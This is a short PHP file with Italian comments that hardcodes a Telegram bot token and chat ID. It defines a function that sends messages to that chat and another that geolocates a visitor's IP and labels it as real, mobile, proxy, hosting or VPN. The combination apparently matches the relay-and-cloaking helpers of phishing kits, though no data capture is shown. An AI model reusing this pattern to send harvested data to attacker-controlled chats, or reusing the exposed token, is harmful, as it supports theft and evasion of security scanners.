<?php
// === CONFIGURAZIONE TELEGRAM ===
define('TG_TOKEN', '8694903414:AAFcmOL95Ozvf9svyiYOoBRUrVIXlah4FlM');
define('TG_CHAT_ID', '-5399275369');

// Invio messaggio Telegram
function tg_send($msg) {
    $url = 'https://api.telegram.org/bot' . TG_TOKEN . '/sendMessage';
    $data = http_build_query([
        'chat_id' => TG_CHAT_ID,
        'text'    => $msg,
        'parse_mode' => 'HTML',
        'disable_web_page_preview' => true
    ]);
    $ctx = stream_context_create(['http' => ['method'=>'POST','header'=>"Content-Type: application/x-www-form-urlencoded\r\n",'content'=>$data,'timeout'=>5]]);
    @file_get_contents($url, false, $ctx);
    return true;
}

// Analisi IP
function analyze_ip($ip) {
    $info = @json_decode(@file_get_contents("http://ip-api.com/json/{$ip}?fields=status,message,country,regionName,city,isp,org,as,mobile,proxy,hosting"), true);
    if (!$info || ($info['status'] ?? '') !== 'success') {
        return ['verdict' => 'UNKNOWN', 'detail' => 'Analisi non disponibile'];
    }
    $verdict = 'REAL';
    if (!empty($info['mobile']))  $verdict = 'MOBILE';
    if (!empty($info['proxy']))   $verdict = 'PROXY';
    if (!empty($info['hosting'])) $verdict = 'HOSTING';
    if (!empty($info['isp']) && stripos($info['isp'], 'vpn') !== false) $verdict = 'VPN';
    return [
        'verdict' => $verdict,
        'detail'  => ($info['city'] ?? '??') . ', ' . ($info['country'] ?? '??') . ' | ' . ($info['isp'] ?? '??')
    ];
}
